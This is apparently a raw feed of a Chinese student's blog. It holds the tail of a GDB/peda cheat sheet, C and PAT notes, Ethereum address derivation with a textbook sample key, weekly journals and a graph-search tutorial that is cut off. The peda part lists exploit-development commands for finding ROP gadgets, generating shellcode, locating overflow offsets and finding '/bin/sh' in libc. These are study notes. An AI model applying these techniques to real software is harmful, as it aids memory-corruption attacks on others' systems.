class="hljs-number">8</span>字节内容<br>x/wx $esp 　　以<span class="hljs-number">4</span>字节<span class="hljs-number">16</span>进制显示栈中内容<br>b表示单字节，h表示双字节，w表示四字 节，g表示八字节<br>s 按字符串输出<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>i：反汇编<br><br>但是实际的组合就那么几种：<br>x/s 地址　　查看字符串<br>x/wx 地址　　查看DWORD<br>x/c 地址　　单字节查看<br>x/<span class="hljs-number">16</span>x $esp+<span class="hljs-number">12</span> 查看寄存器偏移<br><br><span class="hljs-built_in">set</span> args  - 可指定运行时参数。（如：<span class="hljs-built_in">set</span> args <span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">40</span> <span class="hljs-number">50</span>）<br>show args  - 命令可以查看设置好的运行参数。<br></code></pre></td></tr></table></figure><h2 id="peda-插件命令"><a href="#peda-插件命令" class="headerlink" title="peda 插件命令"></a>peda 插件命令</h2><ul><li>aslr - 显示/设定 GDB 的 ASLR(地址空间配置随机加载)设置</li></ul><p>gdb-peda$ aslr ASLR is OFF</p><ul><li>checksec - 检查二进制文件的各种安全选项</li></ul><p>gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</p><ul><li>dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</li><li>dumprop - 在给定内存范围中 Dump 出所有 ROP gadgets</li><li>elfheader - 从被调试的 ELF 文件中获取标题信息</li><li>elfsymbol - 从 ELF 文件获取非调试符号信息（plt 表）</li><li>lookup - 搜索所有地址/参考地址属于一个内存范围</li><li>patch - 修补程序内存以 string / hexstring / int 的地址开始</li><li>procinfo - 显示/ proc / pid /</li><li>pshow - 显示各种 PEDA 选项和其他设置</li><li>pset - 设置各种 PEDA 选项和其他设置</li><li>pattern - 生成字符串模板 写入内存 用于定位溢出点<ul><li>pattern create size 生成特定长度字符串</li><li>pattern offset value 定位字符串</li></ul></li><li>procinfo – Display various info from /proc/pid/</li><li>pshow – Show various PEDA options and other settings</li><li>pset– Set various PEDA options and other settings</li><li>readelf - 从 ELF 文件获取标题信息</li><li>ropgadget - 获取二进制或库的通用 ROP 小工具</li><li>ropsearch - 在内存中搜索 ROP 小工具</li><li>searchmem - 用搜索内存<ul><li>searchmem|find - 在内存中查找字符串，支持正则表达式，例如 searchmem “/bin/sh” libc</li></ul></li><li>shellcode - 生成或下载常用的 shellcode。</li><li>skeleton - 生成 python 漏洞利用代码模板</li><li>vmmap - 可以用来查看栈、bss 段是否可以执行</li><li>xormem - 用一个键异或存储区域</li><li>ptype struct link_map - 查看 link_map 定义</li><li>p &amp;((struct link_map*)0)-&gt;l_info - 查看 l_info 成员偏移</li></ul><h1 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h1><p>【1】<a href="https://blog.csdn.net/kelxLZ/article/details/112972504">https://blog.csdn.net/kelxLZ/article/details/112972504</a><br>​</p><p>​</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为之前把 wsl2 搞崩了，为了这个实验，又又又重装了一次<br>卸载过程参考：<br><a href="https://blog.csdn.net/qq_39522282/article/details/86168907">https://blog.csdn.net/qq_39522282/article/details/86168907</a><br><a href="https://blog.csdn.net/gzroy/article/details/104069536">https://blog.csdn.net/gzroy/article/details/104069536</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PAT算法刷题(2)</title>
    <link href="/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/"/>
    <url>/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/</url>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>something</p><a id="more"></a><h1 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h1><p><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-1.png#clientId=u4e2ecc72-0b61-4&from=paste&height=80&id=u74d31445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=1066&originalType=binary%E2%88%B6=1&size=160064&status=done&style=none&taskId=ube714c6b-8abc-4802-833e-8c45fb5800e&width=533" alt="image.png"><br><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-2.png#clientId=u4e2ecc72-0b61-4&from=paste&height=61&id=u5201477b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=122&originWidth=1067&originalType=binary%E2%88%B6=1&size=134720&status=done&style=none&taskId=u0092dfb5-b66b-4a05-aeb6-8f6dcb75222&width=533.5" alt="image.png"><br><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-3.png#clientId=u4e2ecc72-0b61-4&from=paste&height=295&id=ucedf3117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=736&originalType=binary%E2%88%B6=1&size=388439&status=done&style=none&taskId=u418c5398-37ca-45e4-890a-f7389a9b005&width=368" alt="image.png"><br><img src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-4.png#clientId=u4e2ecc72-0b61-4&from=paste&height=174&id=u5ad65c12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=348&originWidth=1082&originalType=binary%E2%88%B6=1&size=336793&status=done&style=none&taskId=ubbb32c63-b028-443d-b148-9eac916a2f7&width=541" alt="image.png"></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>区块链账户地址相关问题</title>
    <link href="/2021/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98_new/"/>
    <url>/2021/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98_new/</url>
    
    <content type="html"><![CDATA[<p>tags: [区块链]<br>categories: [区块链]<br>cover: “”<br>​</p><hr><p>​</p><a id="more"></a><h1 id="私钥、公钥和地址是如何生成的？"><a href="#私钥、公钥和地址是如何生成的？" class="headerlink" title="私钥、公钥和地址是如何生成的？"></a>私钥、公钥和地址是如何生成的？</h1><p>以太坊地址生成的流程也是：私钥 -&gt; 公钥 -&gt; 地址。因此地址的生成需要三步：</p><ol><li>生成一个随机的私钥（32 字节）-64 位的 16 进制字符</li><li>通过私钥生成公钥（64 字节）</li><li>通过公钥得到地址（20 字节）</li></ol><h2 id="第一步：私钥-private-key"><a href="#第一步：私钥-private-key" class="headerlink" title="第一步：私钥 (private key)"></a>第一步：私钥 (private key)</h2><p>伪随机数产生的 256bit 私钥示例(256bit  16 进制 32 字节)<br><code>18e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</code><br>​</p><h2 id="第二步：公钥-public-key"><a href="#第二步：公钥-public-key" class="headerlink" title="第二步：公钥 (public key)"></a>第二步：公钥 (public key)</h2><ol><li>采用椭圆曲线数字签名算法 ECDSA-secp256k1 将私钥（32 字节）映射成公钥（65 字节）（前缀 04+X 公钥+Y 公钥）：</li></ol><p><code>0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</code></p><ol start="2"><li>拿公钥（非压缩公钥）来 hash，计算公钥的<strong>Keccak-256</strong>哈希值（32bytes）：</li></ol><p><code>fc12ad814631ba689f7abe67**1016f75c54c607f082ae6b0881fac0abeda21781**</code></p><ol start="3"><li>取上一步结果取后 20bytes 即以太坊地址：</li></ol><p><code>1016f75c54c607f082ae6b0881fac0abeda21781</code><br>​</p><h2 id="第三步：地址-address"><a href="#第三步：地址-address" class="headerlink" title="第三步：地址 (address)"></a>第三步：地址 (address)</h2><p><code>0x1016f75c54c607f082ae6b0881fac0abeda21781</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-May-17-to-23</title>
    <link href="/2021/05/20/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23_new/"/>
    <url>/2021/05/20/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>祝融号发回遥测图像，很棒，中国航天 NB！</li><li>华强北的赛格大厦发生摇晃，事故原因正在调查中。</li><li>新垣结衣结婚啦，虽然我没有看过她的作品，但的确是一位看起来非常舒服的女星呢！《逃避虽可耻但有用》是她和他老公主演的电视剧，感觉会很有意思呢，以后有空了一定要看一看！</li><li>比特币开启熊市，距离 6W 美元的高点，目前已经跌破 3W 美元。伴随其的，是整个加密货币市场的全线崩盘，国家机器开始干预这个疯狂的市场。</li><li>南极洲最大冰山脱落，相当于 60%的上海。</li><li>云南大理 6.4 级地震。</li><li>青海 7.4 级地震。</li><li>5 月 22 日，袁隆平院士去世，享年 91 岁。</li><li>吴孟超院士去世，享年 99 岁。</li><li>甘肃白银景泰超级山地马拉松发生突发性局部恶劣天气，导致 21 名马拉松选手遇难。</li><li>大连宝马撞死 5 人，时速达 195km/h，现场视频非常可怕，系投资失败报复社会。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>去和导师面基了，表现的不是很好，有不少问题问题回答都有点问题，提升自己的能力 up,up!还有一个半月，来得及！</li><li>西交好和谐，在里面走有种在青岛的感觉！起伏的道路，到处合抱粗的梧桐，简直无比舒服！虽然楼很旧，但是老师很 nice，真的真的希望可以保研成功到西交呀！</li><li>无线安全实验把我搞迷了，实验成功率不高，特别容易收到干扰，比如我们一直没有收到自己的基站信号，别的人也收不到他们自己的基站信号。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>fuzzingbook2</li><li><a href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></li><li><a href="https://www.anquanke.com/post/id/192823">How2Heap 堆利用学习笔记（一）</a></li><li><a href="https://bbs.pediy.com/thread-259269.htm">堆入门攻略-how2heap 学习总结</a></li><li>patchelf</li><li><a href="https://www.anquanke.com/post/id/86808">how2heap 总结-上</a></li><li><a href="https://www.anquanke.com/post/id/86809">how2heap 总结-下</a></li><li><a href="https://juejin.cn/post/6844903829952004104">how2heap 之 glibc——2.26 版本</a></li><li><a href="https://a1ex.online/2020/08/30/PWN-%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84glibc/">PWN_使用不同版本的 glibc</a></li><li><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>无</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>冒泡排序及优化、快排、希尔排序、堆排序、归并排序</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>我逐渐理解了为什么现在的大部分女生都不再社交平台秀恩爱，或者是简单的展示自己的恋爱状态。</li><li>这周世界非常混乱，周末短短几天，大地震、袁老千古，真的让人心乱，就和做梦似的。记得那天，上午还晴空，过了中午就开始阴云密布，狂风卷集着乌云，冷雨一直下，后到中雨，直至午夜。</li><li>长亭外，古道边，芳草碧连天。我参与了袁老的网上吊唁活动，寄念哀思，希望袁老能在天上继续保佑着华夏大地。</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23-1.jpeg#clientId=u737e3495-1e5b-4&from=drop&height=373&id=u7705954a&margin=%5Bobject%20Object%5D&name=mmexport1621741590095.jpg&originHeight=1920&originWidth=1080&originalType=binary&size=1086399&status=done&style=none&taskId=u80329fcb-efdd-4906-9ef7-3f52be9694e&width=210" alt="mmexport1621741590095.jpg"></p><ol start="4"><li>一定要眼观六路，耳听八方。</li></ol>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PAT算法刷题（1）</title>
    <link href="/2021/05/15/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89_new/"/>
    <url>/2021/05/15/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89_new/</url>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>开始</p><a id="more"></a><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ol><li>浮点型不要用 float 定义，而要用 double 定义，因为精度问题，float 只能有效精度为 6 位左右。</li><li>ASCII 码中，小写字母比大写字母的 ASCII 码大 32，具体是 A<del>Z：65</del>90，a<del>z：97</del>122</li><li>位运算符：<ol><li>A&lt;&lt;x 左移，整数 A 按照二进制左移 x 位</li><li>a &amp; b 位与，整数 a 和 b 按二进制对齐，按照位进行<strong>与运算</strong></li><li>a | b 位或，整数 a 和 b 按二进制对齐，按照位进行<strong>或运算</strong></li><li>a ^ b 位异或，按位进行异或运算</li><li>~a，取反，整数 a 的二进制每一位取反</li></ol></li><li>scanf 的格式化输入–只记录几种不常用的<ol><li>long long 的输入 ：%lld</li><li>double 的输入： %lf</li><li>字符串（char 数组）: %s，注意，字符串输入不需要加&amp;进行取址，即 scanf(“%s”,str)是正确的。（因为数组名称本身就代表这个数组第一个元素的地址，所以不需要加取地址）</li></ol></li><li>typedef 是给复杂的数据结构起别名的<ol><li>例 1： typedef long long LL;//给 long long 起别名 LL</li></ol></li><li>一些常用的 math 函数<ol><li>floor(double x)–向下取整</li><li>ceil(double x)–向上取整</li><li>log()–用于返回以自然对数为底的对数<ol><li>注意，c 里面没有对任意底数求对数的函数，必须用换底公式 log_a{b}=log_e{b}/log_e{a}</li></ol></li><li>sin,cos,tan–三角函数，必须是弧度制，即 pi/2 一类的</li><li>asin,acos–返回 double 的三角函数值</li></ol></li><li>switch</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span>(表达式)&#123;<br>    <span class="hljs-keyword">case</span> 常量结果<span class="hljs-number">1</span>:<br>        ...<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> 结果<span class="hljs-number">2</span>:<br>        ...<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        ....<br>&#125;<br></code></pre></td></tr></table></figure><ol start="8"><li>数组初始化<ol><li>比如 <code>int a[10] = &#123;0&#125;;</code>就可以把整个数组都赋值 0，或者<code>int a[10] = &#123;&#125;;</code>也可以做到</li><li>如果数组大小在 10 的 6 次方以上，需要将其定义在主函数之外，即静态存储区申请空间，如<code>int a[1000000];</code></li><li>memset-对数组中每个元素赋值相同值<ol><li>memset(数组名，值，sizeof(数组名))</li><li>建议只使用 memset 赋值 0 和-1，因为它是按字节赋值，比如 int 是 4 个字节</li><li>对于数组赋予其他值（比如 1），请使用 fill 函数</li></ol></li></ol></li><li>gets 识别\n 作为输入结束，因此使用 scanf 接收完之后，如果要使用 gets，需要先用 getchar()接收整数后的换行符</li><li>strlen()–字符串长度</li><li>strcmp(char a[].char b[])–字符串比较</li><li>strcpy(char a[].char b[])–把 b 字符串数组赋给 a 数组</li><li>字符串处理利器<ol><li>sscanf(char str[],”%d”,&amp; int n)–把字符串数组的内容以%d 的格式写到变量 n 中–从左到右</li><li>sprintf(char str[],”%d”,int n)–把整型变量 n 以%d 的格式写到 str 数组中，从右到左</li></ol></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-May-10-to-16</title>
    <link href="/2021/05/15/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-10-to-16_new/"/>
    <url>/2021/05/15/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-10-to-16_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>成都 49 中跳楼案水落石出</li><li>比特币暴跌，20 万用户爆仓</li><li>盖茨被爆性丑闻</li><li>祝融火星探测器成功登录火星乌托邦平原</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>又是暴雨，下的及时，下的巧妙，恰似那未曾萌芽的爱情。始于暴雨，终于暴雨。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验</p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>图搜索算法学习</title>
    <link href="/2021/05/11/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0_new/"/>
    <url>/2021/05/11/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0_new/</url>
    
    <content type="html"><![CDATA[<p>本文将从图搜索算法的基本流程入手，层层递进地介绍几种图搜索算法。首先是两种针对无权图的基本图搜索算法：<strong>深度优先搜索(Depth First Search, DFS)**、</strong>广度优先搜索(Breadth First Search, BFS)<strong>。它们的区别在于 openlist(后面介绍)所选用的数据结构类型不同，前者使用栈，后者使用队列；之后引入一种启发式搜索算法：</strong>贪婪最佳优先算法*<em>(<strong>Greedy Best First Search, GBFS</strong>)，用来提高搜索效率，但是不能确保找到最优路径；最后介绍两种在路径规划中非常经典的算法：<strong>Dijkstra 算法</strong>、**A\</em>算法**，前者是广度优先算法(BFS)在带权图中的扩展，后者则是在前者中加入启发函数得到的算法，兼顾效率和完备性。</p><a id="more"></a><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>下面切入正题，图搜索算法的基本流程如下：</p><ul><li>创建一个容器，一般称为<strong>openlist</strong>，用来存储将要访问的节点</li><li>将起点加入容器</li><li>开始循环：</li><li>—- 弹出：从容器中取出一个节点</li><li>—- 扩展：获取该节点周围的节点，将这些节点放入容器</li></ul><p>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><h3 id="图结构的邻接矩阵表示法"><a href="#图结构的邻接矩阵表示法" class="headerlink" title="图结构的邻接矩阵表示法"></a>图结构的邻接矩阵表示法</h3><p><strong>邻接矩阵</strong>用来表示图的边集，即节点间的相邻关系集合。设 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276356-ada93f8f-d8ba-4f17-98ec-9af058cd477f.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc6664d&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=102&originalType=url&status=done&style=none&taskId=u8e0433de-cbce-4ed5-b260-4e2f71ad8c0&width=51"> 是一个具有 n 个节点的图，它的邻接矩阵是一个 n 阶矩阵，则其中的元素 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276341-89563210-0b27-48f5-992c-5bc26999cdaa.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=udc2dd334&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=24&originalType=url&status=done&style=none&taskId=u2df13e1a-f9b8-4281-823a-168ccdf6e50&width=12"> 满足：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-1.svg#clientId=u4512e8b3-315c-4&from=paste&height=34&id=ubaaea0f0&margin=%5Bobject%20Object%5D&originHeight=68&originWidth=432&originalType=url&status=done&style=none&taskId=ud90780c7-8c45-4351-afd3-b4a40e55462&width=216"><br>对于无向图，其邻接矩阵是对称矩阵，即 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276360-06638203-15d1-4db8-9832-91cda47c94af.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=u782dacff&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=77&originalType=url&status=done&style=none&taskId=u190fa9eb-a53b-4d83-b57a-bcaa10caa34&width=38.5"> ，而有向图的邻接矩阵不一定对称，其空间复杂度均为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276368-54baba56-84e8-456e-9a3a-2228ee191d73.svg#clientId=u4512e8b3-315c-4&from=paste&height=15&id=u082a2bca&margin=%5Bobject%20Object%5D&originHeight=29&originWidth=54&originalType=url&status=done&style=none&taskId=u3f3f3403-8b0c-41d0-9d2a-a53d9cf6fb2&width=27"> 。以下为两个不带权图的邻接矩阵示例：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-2.jpg#clientId=u4512e8b3-315c-4&from=paste&height=146&id=u6d0c1531&margin=%5Bobject%20Object%5D&originHeight=291&originWidth=300&originalType=url&status=done&style=none&taskId=ua9947cb2-a6f0-4a06-b876-917c53e91ed&width=150"><br>对于<strong>带权图</strong>，设 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276919-e8f40e24-f907-48d0-9439-9c210e6637b7.svg#clientId=u4512e8b3-315c-4&from=paste&height=14&id=ucc327eee&margin=%5Bobject%20Object%5D&originHeight=27&originWidth=71&originalType=url&status=done&style=none&taskId=udc0d541f-3cdf-48fb-bd16-1da62d51156&width=35.5"> 或者 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276928-11917431-d782-4dbc-afcd-7d8bfe260858.svg#clientId=u4512e8b3-315c-4&from=paste&height=8&id=u386178d2&margin=%5Bobject%20Object%5D&originHeight=15&originWidth=10&originalType=url&status=done&style=none&taskId=uf489f51a-13af-43ec-ba53-deea1911e98&width=5"> 上的权值为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725277029-5536e091-2e54-43da-acfc-3aee813c2193.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=uaf1ce0d4&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=28&originalType=url&status=done&style=none&taskId=u0cdccce9-6f0a-43c0-87fe-f34571b4c94&width=14"> ，则带权图的邻接矩阵定义为：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-3.svg#clientId=u4512e8b3-315c-4&from=paste&height=48&id=u5b09c490&margin=%5Bobject%20Object%5D&originHeight=95&originWidth=452&originalType=url&status=done&style=none&taskId=u09279262-4765-43c1-8607-7946ed5add6&width=226"><br>以下为两个带权图的邻接矩阵示例：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-4.jpg#clientId=u4512e8b3-315c-4&from=paste&height=156&id=ue0476deb&margin=%5Bobject%20Object%5D&originHeight=312&originWidth=300&originalType=url&status=done&style=none&taskId=ub5290b0d-99b5-4ace-9bc6-458f46faf37&width=150"></p><h2 id="深度优先搜索-DFS"><a href="#深度优先搜索-DFS" class="headerlink" title="深度优先搜索(DFS)"></a>深度优先搜索(DFS)</h2><p>深度优先，顾名思义即深度越大的节点会被优先扩展。在 DFS 中，使用<strong>栈(Stack)**数据结构来实现上述特性。<br>栈是一种</strong>后进先出(LIFO)<strong>的容器，如下图<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-5.jpg#clientId=u4512e8b3-315c-4&from=paste&height=187&id=ub038a80c&margin=%5Bobject%20Object%5D&originHeight=229&originWidth=252&originalType=url&status=done&style=none&taskId=u32928bb0-c0d9-4527-918f-e65db8c6619&width=206"><br>以在下面的</strong>无权图**中找到从节点 a 到节点 i 的路径为例，说明一下 DFS 算法的工作流程<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-6.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u70b5387b&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=368&originalType=url&status=done&style=none&taskId=u2ec2716b-c4cd-49e2-8c58-e23e99018da&width=184"><br>按照上节的图搜索算法的基本流程进行搜索，过程如下：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-7.jpg#clientId=u4512e8b3-315c-4&from=paste&height=118&id=ue3f3c139&margin=%5Bobject%20Object%5D&originHeight=236&originWidth=1277&originalType=url&status=done&style=none&taskId=u0dcdaa19-58a5-4b08-b306-9e472773c16&width=638.5"><br>从 i 回溯得到路径：a-&gt;b-&gt;c-&gt;g-&gt;i，如下：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-8.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u449947f3&margin=%5Bobject%20Object%5D&originHeight=273&originWidth=367&originalType=url&status=done&style=none&taskId=u2b885412-dc7b-4b20-ac5a-b819ab82efd&width=183.5"></p><h2 id="广度优先搜索-BFS"><a href="#广度优先搜索-BFS" class="headerlink" title="广度优先搜索(BFS)"></a>广度优先搜索(BFS)</h2><p>与 DFS 的“不撞南墙不回头”的个性不同，BFS 在搜索时呈<strong>波状推进</strong>形式，一路稳扎稳打，它是一种<strong>以时间换空间</strong>的方法，能够保证搜索到的路径是最优的。<br>为了实现波状推进搜索特性，BFS 采用<strong>队列(Queue)**作为 openlist 的数据结构。队列是一种</strong>先进先出(FIFO)**的容器，如下图<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-9.jpg#clientId=u4512e8b3-315c-4&from=paste&height=88&id=ud12a1bda&margin=%5Bobject%20Object%5D&originHeight=175&originWidth=643&originalType=url&status=done&style=none&taskId=u3a1b1346-f237-46b8-9d09-a3b4054e02d&width=321.5"><br>其流程与上节中 DFS 类似，继续以上节的图举例，过程如下，首先创建一个队列作为容器，将节点 a 加入队列</p><p><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-10.jpg#clientId=u4512e8b3-315c-4&from=paste&height=54&id=uac838178&margin=%5Bobject%20Object%5D&originHeight=108&originWidth=744&originalType=url&status=done&style=none&taskId=ufb837890-53a7-4c8a-b201-4f00e37582e&width=372"><br>接着将节点 a 弹出队列，将节点 a 周围没有访问过的节点加入队列<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-11.jpg#clientId=u4512e8b3-315c-4&from=paste&height=84&id=u1a3884c7&margin=%5Bobject%20Object%5D&originHeight=168&originWidth=752&originalType=url&status=done&style=none&taskId=u06bcf717-b733-4fe0-a0e8-e47485993d0&width=376"><br>按照上面的流程不断地<strong>弹出、扩展</strong>节点，直到找到节点 i 为止，完整流程如下图：<br><img 